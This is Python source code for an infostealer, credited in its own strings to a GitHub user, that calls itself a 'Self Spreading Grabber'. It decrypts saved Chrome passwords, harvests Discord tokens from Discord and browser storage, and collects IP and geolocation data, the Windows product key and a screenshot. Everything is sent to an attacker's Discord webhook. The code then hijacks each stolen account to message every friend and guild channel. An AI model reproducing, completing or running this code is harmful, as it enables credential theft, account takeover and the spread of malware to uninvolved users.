from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.backends import default_backend
from discord_webhook import DiscordWebhook
from subprocess import check_output
import cv2, os, pyautogui, discord
from discord.ext import commands
import ctypes, ctypes.wintypes
from base64 import b64decode
from shutil import copyfile
from sqlite3 import connect
from sys import platform
from requests import get
from re import findall
from json import loads
import numpy as np

URI            = "<Webhook Here>"
Embed_T        = "**SSG | Self Spreading Grabber | By https://github.com/wizz1337**"
DBP            = r'Google\Chrome\User Data\Default\Login Data'
ADP            = os.environ['LOCALAPPDATA']
Embed_C        = "Fukd By Xin/Wizz"
Tokens         = []

DiscordPaths   = {
    os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb',
    os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb',
    os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb',
    os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',

    os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
    os.getenv('LOCALAPPDATA') + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb',
    os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb'
               }

def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)

def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher

def dpapi(encrypted):
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)

def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]

class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
    def pwsd(self, db_file):
        conn = connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[=========================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[=========================]\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def save(self):
        try:
            with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None

def Chrome_Pass():
    main = chrome()
    try:
        main.chromedb()
    except:
        pass
    main.save()

def Get_Tokens():
    for Path in DiscordPaths:
        if os.path.exists(Path):
            for File_name in os.listdir(Path):
                if not File_name.endswith('.log') and not File_name.endswith('.ldb'):
                    continue

                for Line in [x.strip() for x in open(f'{Path}\\{File_name}', errors='ignore').readlines() if x.strip()]:
                    for Regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for Token in list(set(findall(Regex, Line))):
                            req = get('https://discordapp.com/api/v8/users/@me', headers={"Authorization": Token, "user-agent": "wizz/xin was here ;)"})
                            if req.status_code == 200:   
                                Tokens.append(Token)
                            
    return Tokens

def Get_Ip():
    Grab_IP = get('http://ip-api.com/json/').text
    y = loads(Grab_IP)
    if y["status"] == "success":
        Ip         =  y["query"]
        Country    =  y["country"]
        Region     =  y["regionName"]
        Zip        =  y["zip"]
        Isp        =  y["isp"]
        Message    =  f"Ip Info : {Ip}\n"
        Message    += f"Country : {Country}\n"
        Message    += f"Region  : {Region}\n"
        Message    += f"Zip     : {Zip}\n"
        Message    += f"Isp     : {Isp}\n"
        return Message
    else:
        return "Error"

def Grab_SysInfo():
    usr = os.getenv("UserName")
    keys = check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
    types = check_output('wmic os get Caption').decode().split('\n')[1].strip()
    Message =  f"User   : {usr}\n"
    Message += f"OS     : {types}\n"
    Message += f"OS Key : {keys}\n"
    
    return Message

def ScreenShot():
    image = pyautogui.screenshot()
    image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR)
    cv2.imwrite(r'C:\ProgramData\ss.png', image)

def Send():
    ScreenShot()
    Get_Tokens()
    Message = "```\n"
    for Token in Tokens:
        Message += f"{Token}\n"
    Message     += "```\n"
    Message     += "```\n"
    Message     += Get_Ip()
    Message     += "```\n"
    Message     += "```\n"
    Message     += Grab_SysInfo()
    Message     += "```\n"
    webhook     = DiscordWebhook(url=URI, content=Message, rate_limit_retry=True)

    with open(r"C:\ProgramData\ss.png", "rb") as f:
        webhook.add_file(file=f.read(), filename='ss.png')
    with open(r'C:\ProgramData\passwords.txt', "rb") as f:
        webhook.add_file(file=f.read(), filename='passwords.txt')

    webhook.execute()

Send()

# | Self Spreading |

for Token in Tokens:
    Client = commands.Bot(command_prefix = "SSG By github.com/wizz1337", self_bot = True)
    @Client.event
    async def on_ready():
        print("Ready")
        await Client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="SSG | github.com/wizz1337"))
        for friend in Client.user.friends:
            try:
                embed = discord.Embed(title=Embed_T, color=000000, description=Embed_C)
                embed.set_thumbnail(url=Client.user.avatar_url)
                await friend.send(embed=embed)
            except:
                pass
        for guild in Client.guilds:
            for channel in guild.channels:
                try:
                    embed = discord.Embed(title=Embed_T, color=000000, description=Embed_C)
                    embed.set_thumbnail(url=Client.user.avatar_url)
                    await channel.send(embed=embed)
                except:
                    pass


    Client.run(Token, bot = False)